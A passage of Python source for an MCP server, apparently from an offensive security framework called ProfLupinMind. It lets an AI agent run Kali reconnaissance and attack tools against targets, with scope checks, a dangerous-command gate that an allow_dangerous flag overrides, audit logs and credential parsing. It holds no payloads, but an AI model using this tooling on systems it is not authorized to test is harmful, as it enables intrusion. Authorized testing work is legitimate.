import argparse
import asyncio
import datetime
import json
import logging
import os
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import time
from pathlib import Path
from typing import Any
from urllib.parse import urlparse
import unicodedata

PROJECT_ROOT = Path(__file__).resolve().parent
os.chdir(PROJECT_ROOT)

# Claude Code / VS Code MCP sessions do not always inherit the interactive
# shell PATH. Prefer user-installed recon tools before system binaries so
# ProjectDiscovery's httpx in ~/go/bin wins over the unrelated Python httpx CLI.
_PATH_PREFIXES = [
    str(PROJECT_ROOT / ".proflupinmind-tools" / "bin"),
    str(Path.home() / "go" / "bin"),
    str(Path.home() / ".local" / "bin"),
]
os.environ["PATH"] = os.pathsep.join(
    [p for p in _PATH_PREFIXES if Path(p).exists()]
    + [os.environ.get("PATH", "")]
)

from core.context import SessionContext
from core.executor import execute, pty_execute
from core.http_tools import browser_inspect as http_browser_inspect
from core.http_tools import crawl_site, http_request, intruder_sniper
from core.intelligence import IntelligentDecisionEngine, TargetType
from core.error_handler import IntelligentErrorHandler, GracefulDegradation
from core.payload_gen import PayloadGenerator
from core.runtime import (
    CommandCache,
    PerformanceDashboard,
    ProcessRegistry,
    ResourceMonitor,
    RuntimeHealth,
    SafeWorkspace,
    TaskRegistry,
    Telemetry,
)
from core.ctf_manager import CTFChallenge, CTFWorkflowManager, CTFChallengeAutomator
from core.bug_bounty import BugBountyManager
from reports.generator import ReportGenerator
from safety.audit_log import AuditLog
from safety.guardian import Guardian
from safety.scope import is_in_scope
from sessions.manager import SessionManager
from sessions.models import FindingRecord
from tools.registry import get_tool
from workflows import ALL_WORKFLOWS
from core.output_parser import parse as parse_output

# Singletons for new engines
_intelligence  = IntelligentDecisionEngine()
_error_handler = IntelligentErrorHandler()
_degradation   = GracefulDegradation()
_payload_gen   = PayloadGenerator()
_ctf_manager   = CTFWorkflowManager()
_ctf_automator = CTFChallengeAutomator()
_bug_bounty    = BugBountyManager()
_cache         = CommandCache()
_processes     = ProcessRegistry()
_tasks         = TaskRegistry()
_telemetry     = Telemetry()
_workspace     = SafeWorkspace()
_resources     = ResourceMonitor()
_performance   = PerformanceDashboard()
_runtime_health = RuntimeHealth(_resources, _processes, _tasks, _cache, _performance)

try:
    from mcp.server.fastmcp import FastMCP
except ImportError as exc:
    raise SystemExit(
        "The MCP package is not installed. Run: pip install -r requirements.txt"
    ) from exc

# Disable structured output (outputSchema/structuredContent) globally.
# Newer MCP library versions auto-generate outputSchema from dict return types,
# which causes Claude Code's MCP client to return -32602 for every tool call.
# Must patch base.py's local reference because it uses "from ... import func_metadata".
try:
    import mcp.server.fastmcp.utilities.func_metadata as _fm
    import mcp.server.fastmcp.tools.base as _tb
    _orig_func_metadata = _fm.func_metadata
    def _func_metadata_no_structured(func, skip_names=(), structured_output=None):
        return _orig_func_metadata(func, skip_names=skip_names, structured_output=False)
    _fm.func_metadata = _func_metadata_no_structured
    _tb.func_metadata = _func_metadata_no_structured
except Exception:
    pass


# Parse --port / --host early so FastMCP is created with the correct values
# (decorators bind to the mcp instance at import time, so we must know the
#  port before creating FastMCP, not inside main())
def _early_parse_int(flag: str, default: int) -> int:
    argv = sys.argv[1:]
    for i, arg in enumerate(argv):
        if arg == flag and i + 1 < len(argv):
            return int(argv[i + 1])
        if arg.startswith(f"{flag}="):
            return int(arg.split("=", 1)[1])
    return default

def _early_parse_str(flag: str, default: str) -> str:
    argv = sys.argv[1:]
    for i, arg in enumerate(argv):
        if arg == flag and i + 1 < len(argv):
            return argv[i + 1]
        if arg.startswith(f"{flag}="):
            return arg.split("=", 1)[1]
    return default

_HOST = _early_parse_str("--host", "127.0.0.1")
_PORT = _early_parse_int("--port", 8890)


# ============================================================================
# KALI VISUAL ENGINE
# ============================================================================

class ProfLupinMindVisualEngine:
    WIDTH = 108
    _ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[ -/]*[@-~]")

    C = {
        'MATRIX_GREEN':  '\033[38;5;46m',
        'NEON_CYAN':     '\033[38;5;51m',
        'ELECTRIC_BLUE': '\033[38;5;33m',
        'CYBER_YELLOW':  '\033[38;5;226m',
        'KALI_RED':      '\033[38;5;196m',
        'TERMINAL_GRAY': '\033[38;5;240m',
        'BRIGHT_WHITE':  '\033[97m',
        'ORANGE':        '\033[38;5;208m',
        'PURPLE':        '\033[38;5;129m',
        'RESET':         '\033[0m',
        'BOLD':          '\033[1m',
    }

    @staticmethod
    def _plain_len(text: str) -> int:
        plain = ProfLupinMindVisualEngine._ANSI_RE.sub("", text)
        width = 0
        for char in plain:
            if unicodedata.combining(char):
                continue
            if unicodedata.category(char) in {"Cc", "Cf"}:
                continue
            width += 2 if unicodedata.east_asian_width(char) in {"F", "W"} else 1
        return width

    @staticmethod
    def _pad(text: str, width: int | None = None) -> str:
        width = ProfLupinMindVisualEngine.WIDTH if width is None else width
        return text + (" " * max(0, width - ProfLupinMindVisualEngine._plain_len(text)))

    @staticmethod
    def _center(text: str, width: int | None = None) -> str:
        width = ProfLupinMindVisualEngine.WIDTH if width is None else width
        pad = max(0, width - ProfLupinMindVisualEngine._plain_len(text))
        return (" " * (pad // 2)) + text + (" " * (pad - (pad // 2)))

    @staticmethod
    def _frame(lines: list[str]) -> str:
        C = ProfLupinMindVisualEngine.C
        R = C["RESET"]
        RED = C["KALI_RED"]
        width = ProfLupinMindVisualEngine.WIDTH
        top = f"{RED}╭{'─' * (width + 2)}╮{R}"
        bottom = f"{RED}╰{'─' * (width + 2)}╯{R}"
        body = [top]
        for line in lines:
            body.append(f"{RED}│{R} {ProfLupinMindVisualEngine._pad(line, width)} {RED}│{R}")
        body.append(bottom)
        return "\n".join(body)

    @staticmethod
    def feature_bar() -> str:
        C = ProfLupinMindVisualEngine.C
        R = C["RESET"]
        BDR = C["ELECTRIC_BLUE"]
        G = C["MATRIX_GREEN"]
        Y = C["CYBER_YELLOW"]
        RED = C["KALI_RED"]
        text = (
            f"{Y}⚡{R} {G}AI-Guided Recon{R} | {G}Exploitation{R} | "
            f"{G}Analysis{R} | {RED}◎{R} {G}Bug Bounty{R} | {G}CTF{R} | "
            f"{G}Red Team{R} | {G}Security Research{R}"
        )
        inner_width = min(
            ProfLupinMindVisualEngine.WIDTH - 10,
            max(ProfLupinMindVisualEngine._plain_len(text) + 2, 74),
        )
        inner = ProfLupinMindVisualEngine._center(text, inner_width)
        lines = [
            f"{BDR}╭{('─' * inner_width)}╮{R}",
            f"{BDR}│{R}{inner}{BDR}│{R}",
            f"{BDR}╰{('─' * inner_width)}╯{R}",
        ]
        return "\n".join(ProfLupinMindVisualEngine._center(line) for line in lines)

    @staticmethod
    def shell_prompt(command: str, cwd_label: str | None = None) -> str:
        C = ProfLupinMindVisualEngine.C
        R = C["RESET"]
        CY = C["NEON_CYAN"]
        BL = "\033[94m"
        W = C["BRIGHT_WHITE"]
        GR = C["TERMINAL_GRAY"]
        G = C["MATRIX_GREEN"]
        cwd_label = cwd_label or str(PROJECT_ROOT)
        display_cwd = cwd_label.replace(str(Path.home()), "~")
        cmd_name, _, cmd_rest = command.partition(" ")
        return (
            f"{CY}┌──({GR}.venv{CY})-({BL}kali@kali{CY})-[{W}{display_cwd}{CY}]{R}\n"
            f"{CY}└─{BL}$ {W}{cmd_name}{R}{GR} {cmd_rest.replace('--', f'{G}--')}{R}"
        )

    @staticmethod
    def terminal_logo() -> str:
        """Render a readable terminal logo.

        Modes:
        - auto (default): use chafa image rendering when possible.
        - chafa: force PNG rendering using chafa.
        - off: disable logo.
        """
        mode = os.environ.get("PROFLUPINMIND_LOGO_MODE", "auto").strip().lower()
        if mode == "off":
            return ""
        if mode not in {"auto", "chafa"}:
            mode = "auto"

        # chafa/auto mode
        logo_path = os.environ.get(
            "PROFLUPINMIND_LOGO_PATH",
            str(PROJECT_ROOT / "assets" / "logo-lines-wr.png"),
        )
        if not Path(logo_path).exists():
            return ""
        if shutil.which("chafa") is None:
            return ""
        width = os.environ.get("PROFLUPINMIND_LOGO_WIDTH", "96")
        height = os.environ.get("PROFLUPINMIND_LOGO_HEIGHT", "38")
        source_for_chafa = str(PROJECT_ROOT / "assets" / "logo-lines-wr.png")
        if not Path(source_for_chafa).exists():
            source_for_chafa = str(PROJECT_ROOT / "assets" / "logo-lines.png")
        if not Path(source_for_chafa).exists():
            source_for_chafa = logo_path

        # Optional pre-pass: drop black backdrop and preserve bright strokes.
        magick_bin = shutil.which("magick") or shutil.which("convert")
        if magick_bin is not None:
            transparent_logo = PROJECT_ROOT / ".cache" / "logo.transparent.png"
            try:
                transparent_logo.parent.mkdir(parents=True, exist_ok=True)
                subprocess.run(
                    [
                        magick_bin,
                        logo_path,
                        "-resize",
                        "1400x",
                        "-fuzz",
                        "7%",
                        "-transparent",
                        "black",
                        "-channel",
                        "RGBA",
                        "-sigmoidal-contrast",
                        "8,50%",
                        "-brightness-contrast",
                        "8x18",
                        "-alpha",
                        "on",
                        str(transparent_logo),
                    ],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                if transparent_logo.exists():
                    source_for_chafa = str(transparent_logo)
            except Exception:
                pass
        try:
            raw = subprocess.check_output(
                [
                    "chafa",
                    "--format",
                    "symbols",
                    "--fg-only",
                    "--size",
                    f"{width}x{height}",
                    source_for_chafa,
                ],
                stderr=subprocess.DEVNULL,
            ).decode(errors="ignore")

            # Remove empty top/bottom rows emitted by image-to-terminal rendering
            # so the figlet title starts immediately under the logo.
            lines = raw.splitlines()
            ansi_re = re.compile(r"\x1b\[[0-9;?]*[ -/]*[@-~]")

            def _visible_text(s: str) -> str:
                return ansi_re.sub("", s).strip()

            while lines and not _visible_text(lines[0]):
                lines.pop(0)
            while lines and not _visible_text(lines[-1]):
                lines.pop()
            return "\n".join(lines)
        except Exception:
            return ""

    @staticmethod
    def banner(command: str | None = None, cwd_label: str | None = None) -> str:
        C   = ProfLupinMindVisualEngine.C
        RST = C['RESET']
        W   = C['BRIGHT_WHITE']
        WB  = C['BRIGHT_WHITE'] + C['BOLD']
        RCB = C['KALI_RED'] + C['BOLD']
        GR  = C['TERMINAL_GRAY']

        def _figlet(word: str) -> list[str]:
            try:
                return subprocess.check_output(
                    ["figlet", "-f", "big", word],
                    stderr=subprocess.DEVNULL,
                ).decode().splitlines()
            except Exception:
                return [word]

        lupin_lines = _figlet("ProfLupin")
        mind_lines = _figlet("Mind")
        max_h = max(len(lupin_lines), len(mind_lines))
        lupin_w = max((len(line) for line in lupin_lines), default=0)
        while len(lupin_lines) < max_h:
            lupin_lines.insert(0, "")
        while len(mind_lines) < max_h:
            mind_lines.insert(0, "")

        art = ""
        for left, right in zip(lupin_lines, mind_lines):
            art += f"{WB}{left.ljust(lupin_w)}{RST}{RCB}{right}{RST}\n"

        command = command or "python3 -u mcp_server.py --transport sse --port 8890"

        info = (
            f"\n{GR}  ▸ Initialising ProfLupinMind MCP Server...\n"
            f"  ▸ Tools registry loaded  |  Guardian active  |  Sessions ready{RST}\n"
        )

        title = (
            f"{ProfLupinMindVisualEngine._center(f'{WB}ProfLupin{RST}{RCB}Mind{RST}')}\n"
            f"{ProfLupinMindVisualEngine._center(f'{W}AI-DRIVEN OFFENSIVE SECURITY FRAMEWORK{RST}')}"
        )
        logo = ProfLupinMindVisualEngine.terminal_logo()
        logo_block = f"\n{logo}\n" if logo else "\n"
        body = (
            f"{title}\n\n"
            f"{ProfLupinMindVisualEngine.feature_bar()}\n\n"
            f"{ProfLupinMindVisualEngine.shell_prompt(command, cwd_label)}\n"
            f"{logo_block}"
            f"{art}"
            f"{info}"
        )
        return ProfLupinMindVisualEngine._frame(body.splitlines())

    @staticmethod
    def status_card(title: str, rows: list[tuple[str, str, str, str | None, str | None]]) -> str:
        C = ProfLupinMindVisualEngine.C
        R = C["RESET"]
        B = C["BOLD"]
        BDR = C["ELECTRIC_BLUE"]
        G = C["MATRIX_GREEN"]
        width = ProfLupinMindVisualEngine.WIDTH
        title_text = f"{B}{G}{title}{R}"
        lines = [
            f"{BDR}╭{'─' * width}╮{R}",
            f"{BDR}│{R}  {ProfLupinMindVisualEngine._pad(title_text, width - 2)}{BDR}│{R}",
            f"{BDR}├{'─' * width}┤{R}",
        ]
        for icon, label, value, label_color, value_color in rows:
            lc = label_color or C["NEON_CYAN"]
            vc = value_color or C["BRIGHT_WHITE"]
            row = f"  {icon:<2}  {lc}{label:<12}{R} {vc}{value}{R}"
            lines.append(f"{BDR}│{R}{ProfLupinMindVisualEngine._pad(row, width)}{BDR}│{R}")
        lines.append(f"{BDR}╰{'─' * width}╯{R}")
        return "\n".join(lines)

    @staticmethod
    def progress_bar(progress: float, width: int = 40, pid: int = 0, elapsed: float = 0.0) -> str:
        C = ProfLupinMindVisualEngine.C
        R = C['RESET']
        filled = int(width * min(max(progress, 0.0), 1.0))
        bar = (C['MATRIX_GREEN'] + '█' * filled
               + C['ELECTRIC_BLUE'] + '▒' * max(0, width - filled - 1)
               + C['TERMINAL_GRAY'] + '░'
               + R)
        pct = f"{progress * 100:.1f}%"
        pid_str = f"  pid={pid}" if pid else ""
        elapsed_str = f"  {elapsed:.1f}s" if elapsed > 0 else ""
        return (f"{C['NEON_CYAN']}⚡{R} {C['ELECTRIC_BLUE']}[{R}{bar}{C['ELECTRIC_BLUE']}]{R} "
                f"{C['CYBER_YELLOW']}{pct:>6}{R}{elapsed_str}{pid_str}")

    @staticmethod
    def result_card(command: str, duration: float, exit_code: int,
                    output: str, timed_out: bool, cached: bool = False) -> str:
        C = ProfLupinMindVisualEngine.C
        R = C['RESET']
        B = C['BOLD']
        if timed_out:
            status, icon, sc = "TIMEOUT", "⏱️ ", C['ORANGE']
        elif exit_code == 0:
            status, icon, sc = "SUCCESS", "✅", C['MATRIX_GREEN']
        else:
            status, icon, sc = "FAILED",  "❌", C['KALI_RED']
        BDR = C['ELECTRIC_BLUE']
        GR  = C['TERMINAL_GRAY']
        output_size = len(output.encode())
        cmd_display = (command[:65] + "…") if len(command) > 68 else command
        sep = '═' * 74
        return (
            f"\n{BDR}╔═ {sc}{B}{icon} {status}{BDR} {sep}╗{R}\n"
            f"{BDR}║{R}  {C['CYBER_YELLOW']}CMD  {GR}│{R}  {cmd_display}\n"
            f"{BDR}║{R}  {C['NEON_CYAN']}TIME {GR}│{R}  {duration:.3f}s\n"
            f"{BDR}║{R}  {C['ELECTRIC_BLUE']}SIZE {GR}│{R}  {output_size:,} bytes\n"
            f"{BDR}║{R}  {C['BRIGHT_WHITE']}EXIT {GR}│{R}  {exit_code}   {GR}cache={'HIT' if cached else 'MISS'}{R}\n"
            f"{BDR}╚{'═' * (len(sep) + 12)}╝{R}\n"
        )


# ============================================================================
# LOGGING SETUP
# Uses a dynamic print handler that reads sys.stdout at emit time (not at
# creation time) so uvicorn replacing sys.stdout does not break our output.
# proflupinmind.log → persistent log file
# ============================================================================

import re as _re

LOG_FILE = PROJECT_ROOT / "proflupinmind.log"
RAW_OUTPUT_LOG = Path(
    os.environ.get("PROFLUPINMIND_RAW_OUTPUT_LOG", PROJECT_ROOT / "proflupinmind.raw.log")
).expanduser()

EVENTS_LOG = Path(
    os.environ.get("PROFLUPINMIND_EVENTS_LOG", PROJECT_ROOT / "proflupinmind.events.jsonl")
).expanduser()

_fmt = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'


class _StripAnsiFormatter(logging.Formatter):
    _ansi = _re.compile(r'\033\[[0-9;]*m')
    def format(self, record):
        return self._ansi.sub('', super().format(record))


def _tty(msg: str) -> None:
    """/dev/tty is the controlling terminal — bypasses all stdio redirection and subprocess capture."""
    _mirror_raw_output(msg)
    try:
        with open("/dev/tty", "w") as tty:
            tty.write(msg + "\n")
            tty.flush()
    except Exception:
        try:
            os.write(2, (msg + "\n").encode("utf-8", errors="replace"))
        except Exception:
            pass


def _mirror_raw_output(msg: str) -> None:
    enabled = os.environ.get("PROFLUPINMIND_MIRROR_RAW_OUTPUT", "1").lower()
    if enabled in {"0", "false", "no", "off"}:
        return
    try:
        RAW_OUTPUT_LOG.parent.mkdir(parents=True, exist_ok=True)
        with RAW_OUTPUT_LOG.open("a", encoding="utf-8", errors="replace") as raw:
            raw.write(msg + "\n")
            raw.flush()
    except Exception:
        pass


def _tty_raw(chunk: bytes) -> None:
    """Write raw PTY bytes (ANSI, CR, color) directly to /dev/tty — no stripping."""
    try:
        fd = os.open("/dev/tty", os.O_WRONLY | os.O_NOCTTY)
        try:
            os.write(fd, chunk)
        finally:
            os.close(fd)
    except Exception:
        try:
            os.write(2, chunk)
        except Exception:
            pass


def _append_event(event: dict) -> None:
    """Append a structured JSONL event to the events log for the console viewer."""
    event.setdefault("ts", time.time())
    try:
        EVENTS_LOG.parent.mkdir(parents=True, exist_ok=True)
        with EVENTS_LOG.open("a", encoding="utf-8") as f:
            f.write(json.dumps(event, ensure_ascii=False) + "\n")
            f.flush()
    except Exception:
        pass


class _LiveTerminalHandler(logging.Handler):
    """Writes via /dev/tty — visible even when stderr is captured by parent process."""
    def __init__(self):
        super().__init__()
        self.setFormatter(logging.Formatter(_fmt))

    def emit(self, record):
        _tty(self.format(record))


_file_handler = logging.FileHandler(LOG_FILE, encoding='utf-8')
_file_handler.setFormatter(_StripAnsiFormatter(_fmt))

_terminal_handler = _LiveTerminalHandler()

# Attach directly to __main__ logger — propagate=False keeps uvicorn from
# interfering via the root logger.
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
logger.addHandler(_terminal_handler)
logger.addHandler(_file_handler)
logger.propagate = False

# Root logger at INFO so uvicorn/other modules also show on terminal
logging.basicConfig(level=logging.INFO, handlers=[_terminal_handler], force=True)


# ============================================================================
# MCP SERVER INIT
# ============================================================================

mcp = FastMCP("ProfLupinMind", host=_HOST, port=_PORT)
sessions = SessionManager()
audit = AuditLog()


@mcp.custom_route("/health", methods=["GET"], include_in_schema=False)
async def mcp_health(request):
    from starlette.responses import JSONResponse

    return JSONResponse({
        "status": "healthy",
        "service": "proflupinmind-mcp",
        "transport": "sse",
        "mcp_endpoint": "/sse",
        "api_backend": "http://127.0.0.1:8887/health",
    })


@mcp.custom_route("/", methods=["GET"], include_in_schema=False)
async def mcp_index(request):
    from starlette.responses import JSONResponse

    return JSONResponse({
        "service": "ProfLupinMind MCP Server",
        "status": "running",
        "mcp_endpoint": "/sse",
        "health": "/health",
    })

# ── Flask API (hexstrike-style: tool execution in a normal process so stdout
#    is always visible and tool calls never hit uvicorn's stream layer) ───────
import threading as _threading

_api = None

def _start_flask_api() -> None:
    try:
        # Werkzeug uses click.echo() which writes "* Serving Flask app..." to stdout.
        # In stdio mode stdout is the MCP JSON channel — redirect click output to stderr.
        import click as _click
        _orig_echo = _click.echo
        def _echo_to_stderr(message=None, **kwargs):
            kwargs['file'] = sys.stderr
            _orig_echo(message, **kwargs)
        _click.echo = _echo_to_stderr
        from proflupinmind_api import start as _api_start
        _api_start()
    except Exception as _exc:
        logger.warning(f"⚠️  ProfLupinMind Flask API failed to start: {_exc}")

def _init_api_backend() -> None:
    """Start Flask backend and connect client after banner is printed."""
    global _api
    _threading.Thread(target=_start_flask_api, daemon=True, name="proflupinmind-api").start()
    time.sleep(1.5)  # give Flask time to bind
    try:
        from proflupinmind_client import ProfLupinMindClient as _ProfLupinMindClient
        _api = _ProfLupinMindClient()
        if not _api.available:
            _api = None
    except Exception as _exc:
        logger.warning(f"⚠️  ProfLupinMind client unavailable: {_exc}")
        _api = None
# ─────────────────────────────────────────────────────────────────────────────


# ============================================================================
# TOOLS
# ============================================================================

@mcp.tool()
async def run_kali_tool(
    tool: str,
    target: str,
    options: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
    read_only: bool = False,
    use_cache: bool = True,
) -> dict[str, Any]:
    """Run a registered Kali tool against an in-scope target."""
    info = get_tool(tool)
    if not info:
        logger.warning(f"❌ UNKNOWN TOOL: {tool}")
        return {"error": f"Unknown tool: {tool}"}

    context, sid = _context_for(target, session_id)
    command = _build_command(tool, target, options)
    _tty(f"\n{'='*60}")
    _tty(f"🔧 TOOL: {tool} | TARGET: {target}")
    _tty(f"CMD:  {command}")
    guardian = Guardian(read_only_mode=read_only)
    decision = guardian.assess(command, tool, context, info.get("dangerous", False))

    if not decision.allowed or (decision.dangerous and not allow_dangerous):
        reason = decision.reason or "dangerous command requires explicit approval"
        failure_status = _classify_command_outcome(
            output="",
            exit_code=None,
            timed_out=False,
            blocked_reason=reason,
        )
        sessions.record_command(
            sid, context, command, tool,
            blocked=True, dangerous=decision.dangerous, reason=reason,
        )
        audit.record("mcp_command_blocked", session_id=sid, target=target,
                     tool=tool, command=command, reason=reason)
        _tty(f"🚫 BLOCKED: {reason}")
        logger.warning(f"🚫 BLOCKED: {command} | Reason: {reason}")
        return {
            "session_id": sid,
            "success": False,
            "blocked": True,
            "status": failure_status,
            "reason": reason,
            "command": command,
        }

    if use_cache and not decision.dangerous:
        cached = _cache.get(command)
        if cached:
            _tty(f"💾 CACHE HIT — returning cached result (duration={cached.get('duration',0):.1f}s)")
            logger.info(f"💾 CACHE HIT: {command}")
            _telemetry.record(
                cached.get("exit_code", 0),
                cached.get("duration", 0.0),
                cached.get("timed_out", False),
                cached=True,
            )
            _performance.record_execution(command, cached)
            _tty(ProfLupinMindVisualEngine.result_card(
                command,
                cached.get("duration", 0.0),
                cached.get("exit_code", 0),
                cached.get("output", ""),
                cached.get("timed_out", False),
                cached=True,
            ))
            cached["session_id"] = sid
            return cached

    timeout = info.get("timeout", 300)
    needs_tty = info.get("requires_tty", False)
    _tty(f"\n⚡ EXECUTING: {command}")
    _tty(f"⏱️  TIMEOUT: {timeout}s\n")

    start_time = time.time()
    stdout_lines: list[str] = []
    resource_before = _resources.get_current_usage()
    active_pid = 0

    def on_line(line: str) -> None:
        if line.strip():
            stdout_lines.append(line)
            if active_pid:
                elapsed = time.time() - start_time
                _processes.update(
                    active_pid,
                    progress=min(elapsed / max(timeout, 1), 0.99),
                    message=f"running for {elapsed:.1f}s",
                    bytes_seen=sum(len(item.encode()) for item in stdout_lines),
                )
            # on_chunk emits raw stream events; keep line-mirror for raw log/history only.
            _mirror_raw_output(line)

    def on_chunk(chunk: bytes) -> None:
        _tty_raw(chunk)
        if chunk:
            _append_event({
                "type": "stdout_chunk",
                "data": chunk.decode("utf-8", errors="replace"),
            })

    def on_start(pid: int) -> None:
        nonlocal active_pid
        active_pid = pid
        _processes.register(pid, command)
        _append_event({"type": "command_started", "command": command, "pid": pid})
        _tty(f"📝 REGISTERED: Process {pid} — {command[:60]}...")
        _tty(f"⏰ TIMEOUT: {timeout}s | PID: {pid} starting ...")

    def on_finish(pid: int, code: int) -> None:
        _processes.finish(pid, code)
        _append_event({
            "type": "exit",
            "exit_code": code,
            "duration": round(time.time() - start_time, 2),
            "pid": pid,
        })
        _tty(f"🧹 CLEANUP: Process {pid} removed from registry")

    async def _run_local_tool():
        return await pty_execute(
            command,
            on_line=on_line,
            on_chunk=on_chunk,
            on_start=on_start,
            on_finish=on_finish,
            timeout=timeout,
        )

    result = await _run_local_tool()
    resource_after = _resources.get_current_usage()
    elapsed = result.duration
    _telemetry.record(result.exit_code, result.duration, result.timed_out)

    if result.timed_out:
        _tty(f"⏱️  TIMEOUT after {timeout}s")
        logger.warning(f"⏱️  TIMEOUT: Command exceeded {timeout}s | Duration: {elapsed:.2f}s")
    elif result.exit_code == 0:
        _tty(f"✅ SUCCESS | exit=0 | duration={elapsed:.2f}s")
        logger.info(f"✅ SUCCESS: Command completed | Exit Code: {result.exit_code} | Duration: {elapsed:.2f}s")
    else:
        _tty(f"❌ FAILED | exit={result.exit_code} | duration={elapsed:.2f}s")
        logger.warning(f"❌ FAILED: Exit Code: {result.exit_code} | Duration: {elapsed:.2f}s")

    _tty(ProfLupinMindVisualEngine.result_card(
        command, result.duration, result.exit_code, result.output, result.timed_out
    ))

    context.add_command(command)

    # ── Auto-parse output and extract structured findings ──────────────────
    parsed = parse_output(tool, result.output, target)
    parsed.merge_into_context(context)
    parse_summary = parsed.summary()
    if any(v > 0 for v in parse_summary.values()):
        logger.info(
            f"🔍 PARSED: findings={parse_summary['findings']} | "
            f"ports={parse_summary['ports']} | urls={parse_summary['urls']} | "
            f"cves={parse_summary['cves']} | creds={parse_summary['credentials']} | "
            f"subdomains={parse_summary['subdomains']}"
        )
        # Persist newly extracted findings to the session DB immediately
        if context.findings:
            sessions.sync_findings(sid, context.findings)
    # ──────────────────────────────────────────────────────────────────────

    sessions.record_command(sid, context, command, tool, result=result, dangerous=decision.dangerous)
    sessions.save_context(sid, context)
    audit.record("mcp_command_finished", session_id=sid, target=target,
                 tool=tool, command=command, exit_code=result.exit_code)

    _FALLBACK_TOOLS: dict[str, str] = {
        "gobuster":     "ffuf",
        "ffuf":         "feroxbuster",
        "feroxbuster":  "gobuster",
        "dirsearch":    "gobuster",
        "nuclei":       "nikto",
        "subfinder":    "amass",
        "amass":        "subfinder",
        "nikto":        "nuclei",
        "httpx":        "curl",
        "nmap":         "rustscan",
        "rustscan":     "nmap",
        "wpscan":       "nuclei",
        "enum4linux":   "netexec",
        "smbmap":       "netexec",
    }

    has_structured_results = any(v > 0 for v in parse_summary.values())
    partial_timeout_results = result.timed_out and bool(result.output.strip())
    success = (
        (result.exit_code == 0 and not result.timed_out)
        or has_structured_results
        or partial_timeout_results
    )
    if result.exit_code == 0 and not result.timed_out:
        status = "success"
    elif has_structured_results:
        status = "success_with_findings"
    elif partial_timeout_results:
        status = "partial_timeout"
    else:
        status = _classify_command_outcome(result.output, result.exit_code, result.timed_out)
    fallback = _FALLBACK_TOOLS.get(tool) if not success and status not in {"blocked", "blocked_scope", "blocked_dangerous"} else None
    output_limit = 20000
    output_text = result.output or ""

    response = {
        "session_id": sid,
        "command": command,
        "success": success,
        "status": status,
        "exit_code": result.exit_code,
        "duration": result.duration,
        "timed_out": result.timed_out,
        "partial_results": partial_timeout_results,
        "output": output_text[:output_limit],
        "output_tail": output_text[-output_limit:] if len(output_text) > output_limit else "",
        "output_truncated": len(output_text) > output_limit,
        "cached": False,
        "parsed": parse_summary,
        "result_summary": _summarize_tool_result(tool, parse_summary, status),
        "suggested_fallback": fallback,
        "runtime": {
            "pid": active_pid,
            "resource_before": resource_before,
            "resource_after": resource_after,
        },
    }
    _performance.record_execution(command, response)
    if use_cache and not decision.dangerous and success and not result.timed_out:
        _cache.set(command, response)
    return response


@mcp.tool()
async def run_workflow(
    workflow_name: str,
    target: str,
    session_id: str = "",
    allow_dangerous: bool = False,
    read_only: bool = False,
) -> dict[str, Any]:
    """Run a built-in ProfLupinMind workflow using registry example commands."""
    workflow = _find_workflow_by_name(workflow_name)
    if workflow is None:
        logger.warning(f"❌ UNKNOWN WORKFLOW: {workflow_name}")
        return {"error": f"Unknown workflow: {workflow_name}"}

    context, sid = _context_for(target, session_id)
    total = len(workflow.steps)
    logger.info(f"🔄 WORKFLOW START: {workflow.name} | Target: {target} | Steps: {total}")

    results = []
    for idx, step in enumerate(workflow.steps, 1):
        logger.info(ProfLupinMindVisualEngine.progress_bar(idx / total, pid=0, elapsed=0.0))
        logger.info(f"  [{idx}/{total}] 🔧 STEP: {step.tool} – {step.reason}")
        if not _should_run_workflow_step(step.condition, context):
            logger.info(f"⏭️  SKIPPING: {step.tool} ({step.condition})")
            results.append({
                "tool": step.tool,
                "reason": step.reason,
                "skipped": True,
                "condition": step.condition,
            })
            continue
        outcome = await run_kali_tool(
            tool=step.tool,
            target=target,
            options="",
            session_id=sid,
            allow_dangerous=allow_dangerous,
            read_only=read_only,
        )
        results.append({"tool": step.tool, "reason": step.reason, "result": outcome})
        context = sessions.load_context(sid)
        if outcome.get("blocked"):
            continue

    logger.info(f"✅ WORKFLOW DONE: {workflow.name} | {total} steps completed")
    return {"session_id": sid, "workflow": workflow.name, "results": results}


@mcp.tool()
async def get_session_findings(session_id: str) -> dict[str, Any]:
    """Return findings recorded for a saved ProfLupinMind session."""
    logger.info(f"📋 GET FINDINGS: session={session_id}")
    with sessions.SessionLocal() as db:
        rows = (
            db.query(FindingRecord)
            .filter_by(session_id=session_id)
            .order_by(FindingRecord.id)
            .all()
        )
        findings = [
            {
                "tool": row.tool,
                "type": row.type,
                "detail": row.detail,
                "severity": row.severity,
                "created_at": row.created_at,
            }
            for row in rows
        ]
    logger.info(f"📋 FINDINGS: {len(findings)} record(s) returned for session={session_id}")
    return {"session_id": session_id, "findings": findings}


@mcp.tool()
async def generate_report(session_id: str) -> dict[str, Any]:
    """Generate Markdown, HTML, and PDF report outputs for a saved session."""
    logger.info(f"📝 GENERATING REPORT: session={session_id}")
    try:
        result = ReportGenerator(session_manager=sessions).generate(session_id)
    except ValueError as exc:
        logger.error(f"❌ REPORT ERROR: {exc}")
        return {"error": str(exc)}
    logger.info(f"✅ REPORT READY: {result.markdown_path}")
    return {
        "session_id": session_id,
        "markdown": str(result.markdown_path),
        "html": str(result.html_path),
        "pdf": str(result.pdf_path) if result.pdf_path else None,
    }


@mcp.tool()
async def get_local_network_info() -> dict[str, Any]:
    """Return local IP addresses, default route, and directly connected networks."""
    logger.info("🌐 GET LOCAL NETWORK INFO")
    routes = _run_local_command(["ip", "route"])
    addresses = _run_local_command(["ip", "-brief", "addr"])
    hostname_ips = _run_local_command(["hostname", "-I"])
    parsed_addresses = _parse_local_addresses(addresses)
    if not parsed_addresses:
        parsed_addresses = _parse_hostname_addresses(hostname_ips)
    logger.info(f"✅ NETWORK INFO: {len(parsed_addresses)} interface(s) found")
    return {
        "default_route": _parse_default_route(routes),
        "connected_networks": _parse_connected_networks(routes),
        "local_addresses": parsed_addresses,
        "raw": {
            "ip_route": routes,
            "ip_brief_addr": addresses,
            "hostname_I": hostname_ips,
        },
    }


# ============================================================================
# INTELLIGENCE TOOLS
# ============================================================================

@mcp.tool()
async def analyze_target(
